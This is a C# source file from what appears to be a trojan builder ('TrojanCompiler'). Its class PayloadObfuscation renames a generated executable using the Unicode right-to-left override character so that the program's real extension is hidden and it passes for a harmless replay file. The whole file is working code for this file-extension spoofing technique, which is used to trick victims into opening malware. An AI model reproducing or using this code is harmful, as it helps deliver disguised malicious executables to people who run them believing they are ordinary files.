namespace TrojanCompiler
{
    static internal class PayloadObfuscation
    {
        // Executable Compiler Constants
        private const char LTRO = '\u202d';
        private const char RTLO = '\u202e';


        /// <summary>
        /// Obfuscates executable name with RTLO character
        /// </summary>
        /// <param name="generatedExecutablePath"></param>
        /// <returns>File path of obfuscated executable</returns>
        public static string ObfuscateFileName(string generatedExecutablePath)
        {
            // Output directory
            string outputDirectory = Path.Combine(CoreCompiler.RootProjectDirectory.FullName, CoreCompiler.OutputDirectoryName);
            if(!Directory.Exists(outputDirectory))
                _ = Directory.CreateDirectory(outputDirectory);

            string obfuscatedExecutableFilePath = Path.Combine(outputDirectory, GenerateObfuscatedName());
            try
            {
                File.Move(generatedExecutablePath, obfuscatedExecutableFilePath, true);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            return obfuscatedExecutableFilePath;
        }


        /// <summary>
        /// RTLO name obfuscation
        /// </summary>
        /// <returns>Obfuscated executable name</returns>
        private static string GenerateObfuscatedName()
        {
            (string longestCommonString, int startingIndex, int count) = GetLongestCommonSubstring();

            if (string.IsNullOrEmpty(longestCommonString))
            {
                string[] fileNameSegments = CoreCompiler.OriginalReplayName.Split('.', 2, StringSplitOptions.TrimEntries);
                if (fileNameSegments.Length != 2)
                    Environment.Exit(0);

                string extendedReplayName = fileNameSegments[0] + RTLO + new string(fileNameSegments[^1].Reverse().ToArray()) + '.' + CoreCompiler.FileExtension;

                return extendedReplayName;
            }

            string replayNameFirstPart = CoreCompiler.OriginalReplayName[..startingIndex];
            string replayNameSecondPart = CoreCompiler.OriginalReplayName[(startingIndex + count)..];

            string modifiedReplayName = replayNameFirstPart + RTLO + new string(replayNameSecondPart.Reverse().ToArray()) + '.' + 
                                        new string(CoreCompiler.FileExtension.Replace(longestCommonString.ToLower(), longestCommonString).Reverse().ToArray());

            return modifiedReplayName;
        }


        /// <summary>
        /// Compute longest string matrix
        /// </summary>
        /// <param name="firstString"></param>
        /// <param name="secondString"></param>
        /// <param name="ignoreCase"></param>
        /// <returns>Longest common substring</returns>
        private static (string, int, int) GetLongestCommonSubstring(bool ignoreCase = true)
        {
            string replayReversed = new(CoreCompiler.OriginalReplayName.Reverse().ToArray());
            string extensionReversed = new(CoreCompiler.FileExtension.Reverse().ToArray());

            if (replayReversed == null || extensionReversed == null)
                return (string.Empty, -1, -1);

            int[,] lcsMatrix = CreateLongestCommonSubstringMatrix(replayReversed, extensionReversed, ignoreCase);

            int length = -1, index = -1;
            for (int i = 0; i <= replayReversed.Length; i++)
            {
                for (int j = 0; j <= extensionReversed.Length; j++)
                {
                    if (length < lcsMatrix[i, j])
                    {
                        length = lcsMatrix[i, j];
                        index = i - length;
                    }
                }
            }

            return length > 0 ? (new string(replayReversed.Substring(index, length).Reverse().ToArray()), CoreCompiler.OriginalReplayName.Length - length - index, length) : (string.Empty, -1, -1);


            static int[,] CreateLongestCommonSubstringMatrix(string firstString, string secondString, bool ignoreCase)
            {
                int[,] lcsMatrix = new int[firstString.Length + 1, secondString.Length + 1];

                for (int i = 1; i <= firstString.Length; i++)
                {
                    for (int j = 1; j <= secondString.Length; j++)
                    {
                        bool characterEqual = ignoreCase 
                            ? char.ToUpperInvariant(firstString[i - 1]) == char.ToUpperInvariant(secondString[j - 1]) 
                            : firstString[i - 1] == secondString[j - 1];

                        if (characterEqual)
                            lcsMatrix[i, j] = lcsMatrix[i - 1, j - 1] + 1;
                        else
                            lcsMatrix[i, j] = 0;
                    }
                }

                return lcsMatrix;
            }
        }
    }
}
